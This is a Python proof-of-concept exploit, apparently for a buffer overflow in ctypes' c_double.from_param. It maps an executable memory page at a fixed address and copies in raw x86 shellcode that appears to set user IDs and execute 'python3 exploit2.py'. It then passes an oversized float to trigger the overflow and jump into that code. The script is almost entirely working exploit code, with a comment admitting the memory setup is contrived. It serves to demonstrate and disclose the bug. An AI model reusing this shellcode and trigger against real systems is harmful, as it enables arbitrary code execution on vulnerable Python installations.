from ctypes import (c_double, c_int, CDLL, memmove, create_string_buffer,addressof)
 
###########
# contrived setup, map executable memory with shellcode exactly where we want 
# to jump (an attacker would have to set this up somehow)
libc = CDLL(None)
syscall = libc.syscall
NR_mmap = 192
target_address = 0x34333231
# mmap, 1 page, rwx, anonymous|private, no file, no offset
syscall(NR_mmap, target_address, 0x1000, 7, 0x21, -1, 0)



# shellcode to execute python file - exploit2.py
shellcode = create_string_buffer(b'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x29\x5e\x31\xc0\x50\x89\xe7\xb1\x16\xf3\xa4\x89\x07\x89\xe3\x50\x89\xe2\xeb\x31\x5e\x50\x50\x50\x50\x89\xe7\xb1\x0b\xf3\xa4\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff\x2f\x75\x73\x72\x2f\x6c\x6f\x63\x61\x6c\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e\x33\xe8\xca\xff\xff\xff\x65\x78\x70\x6c\x6f\x69\x74\x32\x2e\x70\x79', 100)

memmove(target_address, addressof(shellcode), 100)

############
 
# trigger the bug
# this will jump to address 0x34333231 (ascii '4321') where the attacker's shell code
# is waiting, and will print out "Randori was here."
print(c_double.from_param(709677e300))
 
# if nothing happened, this should print, however, triggering the bug
# will print an alternate message!
print("All done! No problem.")
